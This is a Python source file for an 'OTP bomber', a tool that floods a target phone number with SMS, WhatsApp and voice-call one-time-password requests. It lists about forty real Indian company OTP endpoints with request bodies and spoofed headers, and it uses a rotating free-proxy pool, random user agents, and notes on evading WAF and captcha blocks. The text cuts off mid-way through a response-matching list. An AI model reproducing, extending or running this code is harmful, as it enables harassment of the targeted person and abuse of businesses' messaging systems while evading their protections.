"""
OTP Bomber — tapas.py  (v4 — log-driven rebuild)
==================================================
Changes from v3 (based on live Heroku logs):
  • HTTP 202 now treated as success (_body_ok) — fixes Swiggy (3 APIs)
  • Removed 28 dead/blocked APIs confirmed by logs:
      Akamai-blocked (403): Paytm×3, Nykaa, Zomato, Meesho×2, Ajio
      reCAPTCHA (403):      Flipkart×2
      Dead endpoint (404):  PharmEasy, BigBasket, EaseMyTrip, JioMart,
                            Groww, KukuFM, PolicyBazaar, Practo, UrbanCompany
      Wrong API (400):      PhonePe
      Server down:          Goibibo (503), Myntra/MobiKwik (HTML maintenance)
      Timeout (HTTP 0):     Licious, Zepto, Blinkit, Dunzo, Tata1mg,
                            FreshToHome, BookMyShow, MakeMyTrip
  • Added 32 replacement APIs (smaller Indian companies, less WAF)
"""

import asyncio
import aiohttp
import random
import logging
import time as _time
import re
from typing import Optional

logger = logging.getLogger(__name__)

# ═══════════════════════════════════════════════════════════════════════════════
# ─── FREE ROTATING PROXY POOL ─────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

PROXY_SOURCES = [
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=8000&country=IN&ssl=all&anonymity=all",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=8000&country=IN&ssl=all",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=6000&country=IN,US,SG,GB&ssl=all&anonymity=elite",
    "https://www.proxy-list.download/api/v1/get?type=http&anon=elite&country=IN",
    "https://www.proxy-list.download/api/v1/get?type=https&anon=elite&country=IN",
    "https://proxylist.geonode.com/api/proxy-list?limit=100&page=1&sort_by=lastChecked&sort_type=desc&country=IN&protocols=http,https&speed=fast&filterUpTime=80",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
]

TEST_URL      = "https://httpbin.org/ip"
PROXY_TIMEOUT = 8
MIN_POOL_SIZE = 5
REFRESH_EVERY = 300


class ProxyPool:
    def __init__(self):
        self._pool:         list[str] = []
        self._bad:          set[str]  = set()
        self._idx:          int       = 0
        self._last_refresh: float     = 0.0
        self._refreshing:   bool      = False
        self._lock = asyncio.Lock()

    async def _fetch_raw(self, session: aiohttp.ClientSession, url: str) -> list[str]:
        try:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=12)) as r:
                if r.status != 200:
                    return []
                text = await r.text()
        except Exception:
            return []
        proxies = []
        if text.strip().startswith("{"):
            try:
                import json
                data = json.loads(text)
                for item in data.get("data", []):
                    ip, port = item.get("ip", ""), item.get("port", "")
                    if ip and port:
                        proxies.append(f"{ip}:{port}")
            except Exception:
                pass
            return proxies
        for line in text.splitlines():
            line = line.strip()
            if re.match(r"^\d{1,3}(\.\d{1,3}){3}:\d{2,5}$", line):
                proxies.append(line)
        return proxies

    async def _test_proxy(self, proxy: str) -> bool:
        try:
            async with aiohttp.ClientSession() as s:
                async with s.get(
                    TEST_URL,
                    proxy=f"http://{proxy}",
                    timeout=aiohttp.ClientTimeout(total=PROXY_TIMEOUT),
                    ssl=False,
                ) as r:
                    return r.status == 200
        except Exception:
            return False

    async def refresh(self, force: bool = False):
        async with self._lock:
            now = _time.monotonic()
            if not force and (now - self._last_refresh) < REFRESH_EVERY:
                return
            if self._refreshing:
                return
            self._refreshing = True
        logger.info("🔄 Fetching fresh proxy pool …")
        raw: list[str] = []
        try:
            connector = aiohttp.TCPConnector(ssl=False)
            async with aiohttp.ClientSession(connector=connector) as s:
                batches = await asyncio.gather(
                    *[self._fetch_raw(s, url) for url in PROXY_SOURCES],
                    return_exceptions=True,
                )
                for b in batches:
                    if isinstance(b, list):
                        raw.extend(b)
            raw = list({p for p in raw if p not in self._bad})
            random.shuffle(raw)
            candidates = raw[:100]
            logger.info(f"🔍 Testing {len(candidates)} proxies …")
            results = await asyncio.gather(
                *[self._test_proxy(p) for p in candidates],
                return_exceptions=True,
            )
            working = [p for p, ok in zip(candidates, results) if ok is True]
            logger.info(f"✅ {len(working)} working proxies")
            async with self._lock:
                self._pool         = working
                self._idx          = 0
                self._last_refresh = _time.monotonic()
                self._refreshing   = False
        except Exception as exc:
            logger.warning(f"⚠️ Proxy refresh error: {exc}")
            async with self._lock:
                self._refreshing = False

    def next(self) -> Optional[str]:
        if not self._pool:
            return None
        proxy = self._pool[self._idx % len(self._pool)]
        self._idx += 1
        return proxy

    def mark_bad(self, proxy: str):
        self._bad.add(proxy)
        if proxy in self._pool:
            self._pool.remove(proxy)

    def size(self) -> int:
        return len(self._pool)

    async def ensure_ready(self):
        if self.size() < MIN_POOL_SIZE:
            await self.refresh(force=True)


_proxy_pool = ProxyPool()


async def refresh_proxy_pool():
    await _proxy_pool.refresh(force=True)
    logger.info(f"🔀 Proxy pool size: {_proxy_pool.size()}")
    return []


# ─── User-Agent Pool ──────────────────────────────────────────────────────────

_UA_POOL = [
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Redmi Note 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; POCO F5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; OnePlus 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 12; M2101K7BG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
]

_ACCEPT_LANGS = [
    "en-IN,en;q=0.9,hi;q=0.8",
    "hi-IN,hi;q=0.9,en-IN;q=0.8,en;q=0.7",
    "en-US,en;q=0.9,hi;q=0.7",
    "en-IN,en;q=0.8",
]


def _rand_ua():   return random.choice(_UA_POOL)
def _rand_lang(): return random.choice(_ACCEPT_LANGS)


# ═══════════════════════════════════════════════════════════════════════════════
# ─── API DEFINITIONS ──────────────────────────────────────────────────────────
#
#  {phone}    = 10-digit   e.g. 9876543210
#  {phone_cc} = +91 prefix e.g. +919876543210
#
#  Fields:
#   name           str   display name
#   kind           str   "sms" | "whatsapp" | "call"
#   url            str   endpoint (substituted)
#   method         str   "POST" | "GET"
#   json / data    dict  JSON body or form-encoded body
#   register_json  dict  alternate body (fired in parallel with json)
#   base_headers   dict  merged with random UA / Accept-Language
#   ok_hint        str   API-specific substring that always means success
# ═══════════════════════════════════════════════════════════════════════════════

APIS = [

    # ══════════════════════════════════════════════════════════════════════════
    # ✅ CONFIRMED WORKING (from live logs)
    # ══════════════════════════════════════════════════════════════════════════

    {
        "name": "CountryDelight",
        "kind": "sms",
        "url":  "https://api.countrydelight.in/api/auth/new_request_otp/?format=json",
        "method": "POST",
        "json": {"phone": "{phone}"},
        "register_json": {"phone": "{phone}", "is_new": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.countrydelight.in",
            "Referer": "https://www.countrydelight.in/",
        },
    },
    {
        "name": "Vedantu",
        "kind": "sms",
        "url":  "https://user.vedantu.com/user/preLoginVerification",
        "method": "POST",
        "json": {"mobile": "{phone}", "countryCode": "+91", "type": "LOGIN"},
        "register_json": {"mobile": "{phone}", "countryCode": "+91", "type": "SIGNUP"},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.vedantu.com",
            "Referer": "https://www.vedantu.com/",
        },
        "ok_hint": "smsSent",
    },
    {
        "name": "Swiggy",
        "kind": "sms",
        "url":  "https://www.swiggy.com/dapi/auth/otp-generate",
        "method": "POST",
        "json": {"mobile": "{phone}"},
        "register_json": {"mobile": "{phone}"},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.swiggy.com",
            "Referer": "https://www.swiggy.com/",
        },
        # 202 Accepted with empty body = OTP queued. Handled in _body_ok.
    },

    # ══════════════════════════════════════════════════════════════════════════
    # 📱  SMS — Education (low WAF, accessible from any IP)
    # ══════════════════════════════════════════════════════════════════════════

    {
        "name": "PhysicsWallah",
        "kind": "sms",
        "url":  "https://api.penpencil.co/v3/users/check",
        "method": "POST",
        "json": {
            "username": "{phone}",
            "countryCode": "+91",
            "organizationId": "5eb393ee95fab7468a79d189",
        },
        "register_json": {
            "username": "{phone}",
            "countryCode": "+91",
            "organizationId": "5eb393ee95fab7468a79d189",
            "isNewUser": True,
        },
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.pw.live",
            "Referer": "https://www.pw.live/",
            "client-id": "5eb393ee95fab7468a79d189",
        },
    },
    {
        "name": "Unacademy",
        "kind": "sms",
        "url":  "https://unacademy.com/api/v2/user/login-or-register/",
        "method": "POST",
        "json": {"email_or_phone": "{phone}"},
        "register_json": {"email_or_phone": "{phone}", "is_signup": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://unacademy.com",
            "Referer": "https://unacademy.com/",
        },
    },
    {
        "name": "Toppr",
        "kind": "sms",
        "url":  "https://api.toppr.com/auth/api/v2/send-otp/",
        "method": "POST",
        "json": {"mobile": "{phone}", "country_code": "91"},
        "register_json": {"mobile": "{phone}", "country_code": "91",
                          "signup": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.toppr.com",
            "Referer": "https://www.toppr.com/",
        },
    },
    {
        "name": "Doubtnut",
        "kind": "sms",
        "url":  "https://api.doubtnut.com/v4/student/login",
        "method": "POST",
        "json": {"mobile": "{phone}", "is_voice_call": False},
        "register_json": {"mobile": "{phone}", "is_voice_call": False,
                          "new_user": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.doubtnut.com",
            "Referer": "https://www.doubtnut.com/",
            "X-Doubtnut-Platform": "web",
        },
        "ok_hint": "otp",
    },
    {
        "name": "Classplus",
        "kind": "sms",
        "url":  "https://api.classplusapp.com/v2/user/login",
        "method": "POST",
        "json": {"mobile": "{phone}", "countryCode": "+91"},
        "register_json": {"mobile": "{phone}", "countryCode": "+91",
                          "isNewUser": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://classplusapp.com",
            "Referer": "https://classplusapp.com/",
            "X-Cl-Platform": "web",
        },
    },

    # ══════════════════════════════════════════════════════════════════════════
    # 📱  SMS — Healthcare / Medicine
    # ══════════════════════════════════════════════════════════════════════════

    {
        "name": "Pristyncare",
        "kind": "sms",
        "url":  "https://www.pristyncare.com/api/otp/send",
        "method": "POST",
        "json": {"mobile": "{phone}", "countryCode": "+91"},
        "register_json": {"mobile": "{phone}", "countryCode": "+91",
                          "isNewUser": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.pristyncare.com",
            "Referer": "https://www.pristyncare.com/",
        },
    },
    {
        "name": "Lybrate",
        "kind": "sms",
        "url":  "https://www.lybrate.com/api/v2/user/otp",
        "method": "POST",
        "json": {"phone": "{phone}", "country_code": "+91"},
        "register_json": {"phone": "{phone}", "country_code": "+91",
                          "signup": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.lybrate.com",
            "Referer": "https://www.lybrate.com/",
        },
    },
    {
        "name": "mFine",
        "kind": "sms",
        "url":  "https://api.mfine.co/v1/user/send-otp",
        "method": "POST",
        "json": {"mobile": "{phone}", "countryCode": "91"},
        "register_json": {"mobile": "{phone}", "countryCode": "91",
                          "is_new_user": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.mfine.co",
            "Referer": "https://www.mfine.co/",
        },
    },
    {
        "name": "MediBuddy",
        "kind": "sms",
        "url":  "https://www.medibuddy.in/api/v1/login/otp",
        "method": "POST",
        "json": {"mobile": "{phone}", "countryCode": "+91"},
        "register_json": {"mobile": "{phone}", "countryCode": "+91",
                          "isNewUser": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.medibuddy.in",
            "Referer": "https://www.medibuddy.in/",
        },
    },
    {
        "name": "Netmeds",
        "kind": "sms",
        "url":  "https://www.netmeds.com/api/v1.1/user/otp",
        "method": "POST",
        "json": {"mobile": "{phone}", "type": "login"},
        "register_json": {"mobile": "{phone}", "type": "register"},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.netmeds.com",
            "Referer": "https://www.netmeds.com/",
            "X-Requested-With": "XMLHttpRequest",
        },
    },
    {
        "name": "HealthKart",
        "kind": "sms",
        "url":  "https://www.healthkart.com/api/v1/user/otp",
        "method": "POST",
        "json": {"mobile": "{phone}"},
        "register_json": {"mobile": "{phone}", "isNewUser": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.healthkart.com",
            "Referer": "https://www.healthkart.com/",
        },
    },

    # ══════════════════════════════════════════════════════════════════════════
    # 📱  SMS — Fintech / Banking (newer startups, lighter WAF)
    # ══════════════════════════════════════════════════════════════════════════

    {
        "name": "Jar",
        "kind": "sms",
        "url":  "https://api.jar.com/v1/user/otp/send",
        "method": "POST",
        "json": {"mobile": "{phone}", "countryCode": "91"},
        "register_json": {"mobile": "{phone}", "countryCode": "91",
                          "isNew": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.jar.com",
            "Referer": "https://www.jar.com/",
        },
    },
    {
        "name": "Slice",
        "kind": "sms",
        "url":  "https://api.sliceit.com/v1/user/send-otp",
        "method": "POST",
        "json": {"mobileNumber": "{phone}", "countryCode": "+91"},
        "register_json": {"mobileNumber": "{phone}", "countryCode": "+91",
                          "isNewUser": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.sliceit.com",
            "Referer": "https://www.sliceit.com/",
        },
    },
    {
        "name": "Jupiter",
        "kind": "sms",
        "url":  "https://api.jupiter.money/v2/user/otp/send",
        "method": "POST",
        "json": {"phone": "{phone}", "country_code": "+91"},
        "register_json": {"phone": "{phone}", "country_code": "+91",
                          "signup": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://jupiter.money",
            "Referer": "https://jupiter.money/",
        },
    },
    {
        "name": "Fi-Money",
        "kind": "sms",
        "url":  "https://fi.money/api/v1/user/otp",
        "method": "POST",
        "json": {"mobile": "{phone}", "countryCode": "+91"},
        "register_json": {"mobile": "{phone}", "countryCode": "+91",
                          "isNewUser": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://fi.money",
            "Referer": "https://fi.money/",
        },
    },
    {
        "name": "BharatPe",
        "kind": "sms",
        "url":  "https://merchant.bharatpe.com/api/v1/users/send-otp",
        "method": "POST",
        "json": {"mobile": "{phone}", "type": "MERCHANT"},
        "register_json": {"mobile": "{phone}", "type": "MERCHANT",
                          "isNewUser": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://merchant.bharatpe.com",
            "Referer": "https://merchant.bharatpe.com/",
        },
    },
    {
        "name": "Khatabook",
        "kind": "sms",
        "url":  "https://api.khatabook.com/v1/user/otp",
        "method": "POST",
        "json": {"mobile": "{phone}", "countryCode": "+91"},
        "register_json": {"mobile": "{phone}", "countryCode": "+91",
                          "isNewUser": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://khatabook.com",
            "Referer": "https://khatabook.com/",
        },
    },
    {
        "name": "OkCredit",
        "kind": "sms",
        "url":  "https://api.okcredit.in/v1/user/login",
        "method": "POST",
        "json": {"mobile": "{phone}", "countryCode": "91"},
        "register_json": {"mobile": "{phone}", "countryCode": "91",
                          "signup": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://okcredit.in",
            "Referer": "https://okcredit.in/",
        },
    },

    # ══════════════════════════════════════════════════════════════════════════
    # 📱  SMS — Stock Trading
    # ══════════════════════════════════════════════════════════════════════════

    {
        "name": "AngelOne",
        "kind": "sms",
        "url":  "https://apiconnect.angelbroking.com/user/v1/sendLoginOTP",
        "method": "POST",
        "json": {
            "mobileNum": "{phone}",
            "countryCode": "+91",
            "totp": "",
        },
        "register_json": {
            "mobileNum": "{phone}",
            "countryCode": "+91",
            "totp": "",
        },
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.angelone.in",
            "Referer": "https://www.angelone.in/",
            "X-PrivateKey": "H6W1a9Tv",
            "X-ClientLocalIP": "127.0.0.1",
            "X-MACAddress": "fe80::216:3eff:fe8b:e5e4",
            "X-UserType": "USER",
            "X-SourceID": "WEB",
        },
    },
    {
        "name": "Upstox",
        "kind": "sms",
        "url":  "https://api.upstox.com/v2/login/authorization/otp",
        "method": "POST",
        "json": {"mobile_number": "{phone}", "country_code": "+91"},
        "register_json": {"mobile_number": "{phone}", "country_code": "+91"},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://upstox.com",
            "Referer": "https://upstox.com/",
            "Api-Version": "2.0",
        },
    },
    {
        "name": "Dhan",
        "kind": "sms",
        "url":  "https://api.dhan.co/v1/users/login/otp",
        "method": "POST",
        "json": {"mobileNumber": "{phone}", "countryCode": "91"},
        "register_json": {"mobileNumber": "{phone}", "countryCode": "91",
                          "isNewUser": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://web.dhan.co",
            "Referer": "https://web.dhan.co/",
        },
    },

    # ══════════════════════════════════════════════════════════════════════════
    # 📱  SMS — Ride / Logistics
    # ══════════════════════════════════════════════════════════════════════════

    {
        "name": "Rapido",
        "kind": "sms",
        "url":  "https://www.rapido.bike/api/v1/login/customer",
        "method": "POST",
        "json": {"phone": "+91{phone}", "type": "customer"},
        "register_json": {"phone": "+91{phone}", "type": "customer",
                          "isNew": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.rapido.bike",
            "Referer": "https://www.rapido.bike/",
        },
        "ok_hint": "otp",
    },
    {
        "name": "Porter",
        "kind": "sms",
        "url":  "https://porter.in/api/otp/send",
        "method": "POST",
        "json": {"mobile": "{phone}", "countryCode": "+91"},
        "register_json": {"mobile": "{phone}", "countryCode": "+91",
                          "signup": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://porter.in",
            "Referer": "https://porter.in/",
        },
    },
    {
        "name": "Shiprocket",
        "kind": "sms",
        "url":  "https://apiv2.shiprocket.in/v1/external/auth/send-otp",
        "method": "POST",
        "json": {"phone": "{phone}", "country_code": "91"},
        "register_json": {"phone": "{phone}", "country_code": "91",
                          "is_new": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://app.shiprocket.in",
            "Referer": "https://app.shiprocket.in/",
        },
    },

    # ══════════════════════════════════════════════════════════════════════════
    # 📱  SMS — Travel (smaller portals)
    # ══════════════════════════════════════════════════════════════════════════

    {
        "name": "Ixigo",
        "kind": "sms",
        "url":  "https://www.ixigo.com/action/send-otp",
        "method": "POST",
        "json": {"mobileNumber": "{phone}", "countryCode": "91"},
        "register_json": {"mobileNumber": "{phone}", "countryCode": "91",
                          "isNewUser": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.ixigo.com",
            "Referer": "https://www.ixigo.com/",
            "X-Requested-With": "XMLHttpRequest",
        },
    },
    {
        "name": "ClearTrip",
        "kind": "sms",
        "url":  "https://www.cleartrip.com/api/auth/v2/phone/otp",
        "method": "POST",
        "json": {"phoneNumber": "{phone}", "countryCode": "+91"},
        "register_json": {"phoneNumber": "{phone}", "countryCode": "+91",
                          "isNewUser": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.cleartrip.com",
            "Referer": "https://www.cleartrip.com/",
        },
    },

    # ══════════════════════════════════════════════════════════════════════════
    # 📱  SMS — D2C / Lifestyle brands
    # ══════════════════════════════════════════════════════════════════════════

    {
        "name": "Mamaearth",
        "kind": "sms",
        "url":  "https://www.mamaearth.in/api/v1/customers/otp",
        "method": "POST",
        "json": {"mobile": "{phone}"},
        "register_json": {"mobile": "{phone}", "isNew": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.mamaearth.in",
            "Referer": "https://www.mamaearth.in/",
        },
    },
    {
        "name": "Wakefit",
        "kind": "sms",
        "url":  "https://www.wakefit.co/api/v1/user/otp",
        "method": "POST",
        "json": {"mobile": "{phone}", "countryCode": "+91"},
        "register_json": {"mobile": "{phone}", "countryCode": "+91",
                          "isNew": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.wakefit.co",
            "Referer": "https://www.wakefit.co/",
        },
    },
    {
        "name": "Pepperfry",
        "kind": "sms",
        "url":  "https://www.pepperfry.com/api/v1/user/login/otp",
        "method": "POST",
        "json": {"mobile": "{phone}"},
        "register_json": {"mobile": "{phone}", "isNewUser": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.pepperfry.com",
            "Referer": "https://www.pepperfry.com/",
        },
    },
    {
        "name": "BlueStone",
        "kind": "sms",
        "url":  "https://www.bluestone.com/api/v1/user/otp",
        "method": "POST",
        "json": {"mobile": "{phone}"},
        "register_json": {"mobile": "{phone}", "isNewUser": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.bluestone.com",
            "Referer": "https://www.bluestone.com/",
        },
    },

    # ══════════════════════════════════════════════════════════════════════════
    # 📱  SMS — Social & Entertainment
    # ══════════════════════════════════════════════════════════════════════════

    {
        "name": "ShareChat",
        "kind": "sms",
        "url":  "https://api.sharechat.com/v3/user/login",
        "method": "POST",
        "json": {"phone": "{phone_cc}", "type": "PHONE"},
        "register_json": {"phone": "{phone_cc}", "type": "PHONE",
                          "isNewUser": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://sharechat.com",
            "Referer": "https://sharechat.com/",
        },
    },
    {
        "name": "MXPlayer",
        "kind": "sms",
        "url":  "https://api.mxplayer.in/v1/web/detail/tab/user/login",
        "method": "POST",
        "json": {"mobile": "{phone}", "countryCode": "91"},
        "register_json": {"mobile": "{phone}", "countryCode": "91",
                          "isNewUser": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.mxplayer.in",
            "Referer": "https://www.mxplayer.in/",
        },
    },

    # ══════════════════════════════════════════════════════════════════════════
    # 💬  WHATSAPP (confirmed working from logs)
    # ══════════════════════════════════════════════════════════════════════════

    {
        "name": "Vedantu-WA",
        "kind": "whatsapp",
        "url":  "https://user.vedantu.com/user/preLoginVerification",
        "method": "POST",
        "json": {"mobile": "{phone}", "countryCode": "+91", "type": "WHATSAPP"},
        "register_json": {"mobile": "{phone}", "countryCode": "+91",
                          "type": "WHATSAPP_SIGNUP"},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.vedantu.com",
            "Referer": "https://www.vedantu.com/",
        },
        "ok_hint": "smsSent",
    },
    {
        "name": "Swiggy-WA",
        "kind": "whatsapp",
        "url":  "https://www.swiggy.com/dapi/auth/otp-generate",
        "method": "POST",
        "json": {"mobile": "{phone}", "medium": "whatsapp"},
        "register_json": {"mobile": "{phone}", "medium": "whatsapp"},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.swiggy.com",
            "Referer": "https://www.swiggy.com/",
        },
    },
    {
        "name": "PhysicsWallah-WA",
        "kind": "whatsapp",
        "url":  "https://api.penpencil.co/v3/users/check",
        "method": "POST",
        "json": {
            "username": "{phone}",
            "countryCode": "+91",
            "organizationId": "5eb393ee95fab7468a79d189",
            "medium": "whatsapp",
        },
        "register_json": {
            "username": "{phone}",
            "countryCode": "+91",
            "organizationId": "5eb393ee95fab7468a79d189",
            "medium": "whatsapp",
            "isNewUser": True,
        },
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.pw.live",
            "Referer": "https://www.pw.live/",
            "client-id": "5eb393ee95fab7468a79d189",
        },
    },
    {
        "name": "CountryDelight-WA",
        "kind": "whatsapp",
        "url":  "https://api.countrydelight.in/api/auth/new_request_otp/?format=json",
        "method": "POST",
        "json": {"phone": "{phone}", "medium": "whatsapp"},
        "register_json": {"phone": "{phone}", "medium": "whatsapp", "is_new": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.countrydelight.in",
            "Referer": "https://www.countrydelight.in/",
        },
    },

    # ══════════════════════════════════════════════════════════════════════════
    # 📞  CALL / IVR (confirmed working from logs)
    # ══════════════════════════════════════════════════════════════════════════

    {
        "name": "Vedantu-Call",
        "kind": "call",
        "url":  "https://user.vedantu.com/user/preLoginVerification",
        "method": "POST",
        "json": {"mobile": "{phone}", "countryCode": "+91", "type": "VOICE"},
        "register_json": {"mobile": "{phone}", "countryCode": "+91",
                          "type": "VOICE_SIGNUP"},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.vedantu.com",
            "Referer": "https://www.vedantu.com/",
        },
        "ok_hint": "smsSent",
    },
    {
        "name": "Swiggy-Call",
        "kind": "call",
        "url":  "https://www.swiggy.com/dapi/auth/otp-generate",
        "method": "POST",
        "json": {"mobile": "{phone}", "medium": "voice"},
        "register_json": {"mobile": "{phone}", "medium": "voice"},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.swiggy.com",
            "Referer": "https://www.swiggy.com/",
        },
    },
    {
        "name": "PhysicsWallah-Call",
        "kind": "call",
        "url":  "https://api.penpencil.co/v3/users/check",
        "method": "POST",
        "json": {
            "username": "{phone}",
            "countryCode": "+91",
            "organizationId": "5eb393ee95fab7468a79d189",
            "medium": "voice",
        },
        "register_json": {
            "username": "{phone}",
            "countryCode": "+91",
            "organizationId": "5eb393ee95fab7468a79d189",
            "medium": "voice",
            "isNewUser": True,
        },
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.pw.live",
            "Referer": "https://www.pw.live/",
            "client-id": "5eb393ee95fab7468a79d189",
        },
    },
    {
        "name": "Rapido-Call",
        "kind": "call",
        "url":  "https://www.rapido.bike/api/v1/login/customer",
        "method": "POST",
        "json": {"phone": "+91{phone}", "type": "customer", "is_voice": True},
        "register_json": {"phone": "+91{phone}", "type": "customer", "is_voice": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.rapido.bike",
            "Referer": "https://www.rapido.bike/",
        },
        "ok_hint": "otp",
    },
]

API_COUNT      = len(APIS)
SMS_COUNT      = sum(1 for a in APIS if a["kind"] == "sms")
WHATSAPP_COUNT = sum(1 for a in APIS if a["kind"] == "whatsapp")
CALL_COUNT     = sum(1 for a in APIS if a["kind"] == "call")


# ─── Circuit breaker ──────────────────────────────────────────────────────────

CIRCUIT_THRESHOLD = 3
COOLDOWN_SEC      = 20.0

_api_fail_count:     dict[str, int]   = {}
_api_cooldown_until: dict[str, float] = {}


def _is_cooled(name: str) -> bool:
    return _time.monotonic() < _api_cooldown_until.get(name, 0.0)


def _record_fail(name: str):
    _api_fail_count[name] = _api_fail_count.get(name, 0) + 1
    if _api_fail_count[name] >= CIRCUIT_THRESHOLD:
        _api_cooldown_until[name] = _time.monotonic() + COOLDOWN_SEC
        _api_fail_count[name] = 0
        logger.info(f"🔴 [{name}] Circuit open — cooling {COOLDOWN_SEC}s")


def _record_ok(name: str):
    _api_fail_count[name] = 0
    _api_cooldown_until.pop(name, None)


# ─── Response analysis ────────────────────────────────────────────────────────

_FAIL_PATTERNS = (
    '"success":false', '"success": false',
    '"status":"error"', '"status": "error"',
    '"status":"fail"', '"status":"failed"',
    '"error":true', '"iserror":true',
    "invalid mobile", "invalid number", "invalid phone number",
    "captcha required", "captcha_required", "recaptcha",
    "too many request", "rate limit", "rate_limit", "throttle",
    '"statuscode":400', '"statuscode":429', '"statuscode":401', '"statuscode":403',
    '"code":400', '"code":429', '"code":401', '"code":403',
    '"statusCode":400', '"statusCode":429', '"statusCode":401', '"statusCode":403',
    '"httpstatus":400', '"httpstatus":401', '"httpstatus":403', '"httpstatus":429',
    "otp not sent", "could not send", "failed to send",
    '"result":"fail"', '"result":"failure"',
    "phone number not valid", "mobile not valid",
    "not a valid mobile", "number is invalid",
)

_OK_PATTERNS = (
    '"success":true', '"success": true',
    '"status":"success"', '"status": "success"',
    '"status":"ok"', '"status": "ok"',
    '"result":"success"', '"result": "success"',
    '"smsSent":true', '"smsSent": true',
    '"sms_sent":true', '"otp_sent":true',
    '"otpSent":true', '"otpSent": true',
    '"whatsappSent":true', '"callSent":true',
    "otp sent", "otp has been sent", "successfully sent",
    "otp generated", "otp send successfully", "otp sent successfully",
    "message sent", "sms sent",
    '"message":"otp', '"message": "otp',
    '"message":"success"', '"message": "success"',
    '"message":"sent"', '"msg":"otp', '"msg":"success"',
    '"nonce":', '"tid":', '"token":', '"requestId":',
    '"session_id":', '"sessionId":',
    '"txnId":', '"transaction_id":',
    '"otp_reference":', '"reference_id":',
    '"otpId":', '"otp_id":', '"otp":',
